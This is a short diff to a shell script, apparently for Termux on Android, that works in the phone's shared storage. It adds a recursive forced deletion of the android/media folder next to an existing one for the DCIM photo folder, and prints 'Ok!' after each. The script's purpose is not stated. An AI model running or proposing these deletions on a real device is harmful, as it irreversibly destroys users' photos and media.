@@ -6,6 +6,11 @@ DIRECTORY="$HOME/storage/shared"
 
 cd $DIRECTORY
 
+if [[ -d android/media ]]; then
+	rm -rf android/media
+	echo 'android/media -> Ok!'
+fi
+
 if [[ -d DCIM ]]; then
 	rm -rf DCIM
 	echo 'DCIM -> Ok!'
